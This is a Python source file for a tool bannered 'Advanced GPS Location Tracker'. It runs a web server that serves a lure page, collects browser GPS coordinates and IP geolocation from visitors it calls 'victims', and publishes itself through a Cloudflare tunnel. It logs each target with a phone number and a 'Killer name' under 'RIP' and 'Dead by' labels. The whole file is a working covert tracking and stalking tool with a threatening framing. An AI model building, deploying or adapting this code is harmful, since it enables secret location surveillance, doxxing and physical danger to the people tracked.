import os
import sys
import json
import time
import threading
import subprocess
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style, init
import re
from datetime import datetime

# INITIALIZATION
init(autoreset=True)

# COLOR SYSTEM
class Colors:
    PURPLE = '\033[95m'
    DARK_PURPLE = '\033[38;5;54m'
    LIGHT_PURPLE = '\033[38;5;93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    LIGHT_GRAY = '\033[37m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# BANNER CON ESTILO SANGRIENTO
def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"{Colors.LIGHT_PURPLE}{Colors.BOLD}")
    print("   ▄████████  ▄█     ▄████████    ▄█   ▄█▄    ▄████████ ")
    print("  ███    ███ ███    ███    ███   ███ ▄███▀   ███    ███ ")
    print("  ███    █▀  ███▌   ███    █▀    ███▐██▀     ███    █▀  ")
    print("  ███        ███▌  ▄███▄▄▄      ▄█████▀     ▄███▄▄▄     ")
    print("▀███████████ ███▌ ▀▀███▀▀▀     ▀▀█████▄    ▀▀███▀▀▀     ")
    print("         ███ ███    ███    █▄    ███▐██▄     ███    █▄  ")
    print("   ▄█    ███ ███    ███    ███   ███ ▀███▄   ███    ███ ")
    print(" ▄████████▀  █▀     ██████████   ███   ▀█▀   ██████████ ")
    print(f"{Colors.RED}  /\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\")
    print(f"{Colors.RED}  \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ {Colors.RESET}")
    print(f"{Colors.WHITE}{Colors.BOLD}        Advanced GPS Location Tracker")
    print(f"{Colors.RED}            by D3SPA1R x KVSR{Colors.RESET}\n")

class Victim:
    def __init__(self, ip, isp, location, coords, browser, gps_data=None):
        self.ip = ip
        self.isp = isp
        self.location = location
        self.coords = coords
        self.browser = browser
        self.gps_data = gps_data
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.phone = None
        self.killer = None
        
    def display(self):
        print(f"\n{Colors.LIGHT_PURPLE}GEO RIPPER - RIP")
        if self.phone or self.killer:
            if self.phone:
                print(f"{Colors.WHITE}(CEL) {self.phone}")
            if self.killer:
                print(f"{Colors.RED}Dead by: {self.killer}")
        
        print(f"\n{Colors.DARK_PURPLE}IP        : {Colors.WHITE}{self.ip}")
        print(f"{Colors.DARK_PURPLE}ISP       : {Colors.WHITE}{self.isp}")
        print(f"{Colors.DARK_PURPLE}Location  : {Colors.WHITE}{self.location}")
        print(f"{Colors.DARK_PURPLE}Coordinates: {Colors.WHITE}{self.coords}")
        print(f"{Colors.DARK_PURPLE}Time      : {Colors.WHITE}{self.timestamp}")
        print(f"{Colors.DARK_PURPLE}Browser   : {Colors.WHITE}{self.browser}")
        
        if self.gps_data:
            print(f"{Colors.DARK_PURPLE}GPS Data  : {Colors.WHITE}{self.gps_data['url']}")
            print(f"{Colors.DARK_PURPLE}Accuracy  : {Colors.WHITE}{self.gps_data['accuracy']}m")
            print(f"{Colors.DARK_PURPLE}Source    : {Colors.WHITE}{self.gps_data['source']}")
    
    def save(self):
        with open("victims.log", "a", encoding="utf-8") as f:
            f.write(f"\n=== Victim ===\n")
            f.write(f"GEO RIPPER - RIP\n")
            if self.phone:
                f.write(f"(CEL) {self.phone}\n")
            if self.killer:
                f.write(f"Dead by: {self.killer}\n")
            
            f.write(f"IP: {self.ip}\n")
            f.write(f"ISP: {self.isp}\n")
            f.write(f"Location: {self.location}\n")
            f.write(f"Coordinates: {self.coords}\n")
            f.write(f"Time: {self.timestamp}\n")
            f.write(f"Browser: {self.browser}\n")
            
            if self.gps_data:
                f.write(f"GPS: {self.gps_data['url']}\n")
                f.write(f"Accuracy: {self.gps_data['accuracy']}m\n")
                f.write(f"Source: {self.gps_data['source']}\n")
            f.write("="*40 + "\n")

class RequestHandler(BaseHTTPRequestHandler):
    def log_request(self, code='-', size='-'): pass
    
    def get_real_ip(self):
        ip = self.client_address[0]
        headers = ['X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP']
        for header in headers:
            if header in self.headers:
                ip = self.headers[header].split(',')[0].strip()
                break
        return ip
    
    def get_geo_info(self, ip):
        if ip in ['127.0.0.1', '::1']:
            return {}
        
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,lat,lon", timeout=5)
            return response.json() if response.json().get('status') == 'success' else {}
        except:
            return {}
    
    def do_GET(self):
        if self.path == '/':
            try:
                with open('index.html', 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(f.read())
                self.log_connection()
            except FileNotFoundError:
                self.send_error(404, "File Not Found")
    
    def do_POST(self):
        if self.path == '/gps_data':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode())
                ip = self.get_real_ip()
                geo_data = self.get_geo_info(ip)
                
                victim = Victim(
                    ip=ip,
                    isp=geo_data.get('isp', 'Unknown'),
                    location=f"{geo_data.get('city', 'Unknown')}, {geo_data.get('regionName', 'Unknown')}",
                    coords=f"{geo_data.get('lat', 'N/A')}, {geo_data.get('lon', 'N/A')}",
                    browser=self.headers.get('User-Agent', 'Unknown'),
                    gps_data={
                        'url': f"https://www.google.com/maps?q={data['lat']},{data['lon']}",
                        'accuracy': data.get('accuracy', 'N/A'),
                        'source': data.get('source', 'Unknown')
                    } if 'lat' in data and 'lon' in data else None
                )
                
                victim.display()
                self.prompt_for_details(victim)
                victim.save()
                
                self.send_response(200)
                self.end_headers()
            except Exception as e:
                print(f"{Colors.RED}[!] Error processing GPS data: {e}{Colors.RESET}")
    
    def prompt_for_details(self, victim):
        print(f"\n{Colors.LIGHT_PURPLE}[+] {Colors.WHITE}Add details? (Y/N): ", end="")
        if input().strip().lower() == 'y':
            print(f"{Colors.LIGHT_PURPLE}[+] {Colors.WHITE}Phone: ", end="")
            victim.phone = input().strip()
            
            print(f"{Colors.LIGHT_PURPLE}[+] {Colors.WHITE}Killer name: ", end="")
            victim.killer = input().strip()
    
    def log_connection(self):
        ip = self.get_real_ip()
        geo_data = self.get_geo_info(ip)
        
        print(f"\n{Colors.LIGHT_PURPLE}[{Colors.WHITE}+{Colors.LIGHT_PURPLE}] {Colors.WHITE}New connection")
        print(f"{Colors.DARK_PURPLE}┌───────────────────────────────────────────────")
        print(f"│ {Colors.DARK_PURPLE}IP: {Colors.WHITE}{ip}")
        
        if geo_data:
            print(f"│ {Colors.DARK_PURPLE}ISP: {Colors.WHITE}{geo_data.get('isp', 'Unknown')}")
            print(f"│ {Colors.DARK_PURPLE}Location: {Colors.WHITE}{geo_data.get('city', 'Unknown')}, {geo_data.get('regionName', 'Unknown')}")
            print(f"│ {Colors.DARK_PURPLE}Coordinates: {Colors.WHITE}{geo_data.get('lat', 'N/A')}, {geo_data.get('lon', 'N/A')}")
        else:
            print(f"│ {Colors.RED}No geo data available")
        
        print(f"└───────────────────────────────────────────────{Colors.RESET}")

def start_server():
    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print(f"\n{Colors.LIGHT_PURPLE}[{Colors.WHITE}+{Colors.LIGHT_PURPLE}] {Colors.WHITE}Server running at {Colors.LIGHT_GRAY}http://0.0.0.0:8080")
    print(f"{Colors.DARK_PURPLE}─────────────────────────────────────────────────{Colors.RESET}")
    server.serve_forever()

def start_tunnel():
    try:
        print(f"{Colors.LIGHT_PURPLE}[{Colors.WHITE}+{Colors.LIGHT_PURPLE}] {Colors.WHITE}Starting Cloudflare tunnel...{Colors.RESET}")
        
        # Iniciar el túnel en segundo plano y redirigir salida
        with open('cloudflared.log', 'w') as log_file:
            process = subprocess.Popen(
                ['cloudflared', 'tunnel', '--url', 'http://localhost:8080'],
                stdout=log_file,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
        
        # Esperar a que el túnel esté listo
        time.sleep(5)
        
        # Leer la URL del archivo de log
        try:
            with open('cloudflared.log', 'r') as f:
                content = f.read()
                match = re.search(r'https://[^\s]+\.trycloudflare\.com', content)
                if match:
                    url = match.group(0)
                    print(f"\n{Colors.LIGHT_PURPLE}[{Colors.WHITE}✔{Colors.LIGHT_PURPLE}] {Colors.WHITE}Tunnel active: {Colors.LIGHT_GRAY}{url}")
                    print(f"{Colors.DARK_PURPLE}─────────────────────────────────────────────────{Colors.RESET}")
                    return url
        except:
            pass
        
        print(f"{Colors.RED}[!] Failed to get tunnel URL after 5 seconds{Colors.RESET}")
        print(f"{Colors.YELLOW}Check cloudflared.log for details{Colors.RESET}")
        sys.exit(1)
        
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Install cloudflared first{Colors.RESET}")
        sys.exit(1)

def view_victims():
    try:
        with open("victims.log", "r") as f:
            print(f"\n{Colors.LIGHT_PURPLE}{'='*50}")
            print(f"{Colors.WHITE}{Colors.BOLD}VICTIMS LOG{Colors.RESET}")
            print(f"{Colors.LIGHT_PURPLE}{'='*50}{Colors.RESET}")
            print(f.read())
    except FileNotFoundError:
        print(f"{Colors.RED}[!] No victims logged yet{Colors.RESET}")

def main_menu():
    show_banner()
    print(f"{Colors.WHITE}Select mode:{Colors.RESET}")
    print(f"  {Colors.LIGHT_PURPLE}[1]{Colors.LIGHT_GRAY} Local Server")
    print(f"  {Colors.LIGHT_PURPLE}[2]{Colors.LIGHT_GRAY} Cloudflare Tunnel")
    print(f"  {Colors.LIGHT_PURPLE}[3]{Colors.LIGHT_GRAY} View Victims")
    print(f"  {Colors.LIGHT_PURPLE}[4]{Colors.LIGHT_GRAY} Exit\n")
    
    while True:
        choice = input(f"{Colors.DARK_PURPLE}>> {Colors.RESET}").strip()
        
        if choice == '1':
            start_server()
            break
        elif choice == '2':
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()
            time.sleep(1)
            tunnel_url = start_tunnel()
            if tunnel_url:
                print(f"\n{Colors.LIGHT_PURPLE}[{Colors.WHITE}*{Colors.LIGHT_PURPLE}] {Colors.WHITE}Press Ctrl+C to stop the server")
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print(f"\n{Colors.RED}[!] Stopping server...{Colors.RESET}")
        elif choice == '3':
            view_victims()
            input(f"\n{Colors.LIGHT_PURPLE}[{Colors.WHITE}+{Colors.LIGHT_PURPLE}] Press Enter to continue...")
            main_menu()
            break
        elif choice == '4':
            print(f"{Colors.RED}[!] Exiting...{Colors.RESET}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Stopped by user{Colors.RESET}")
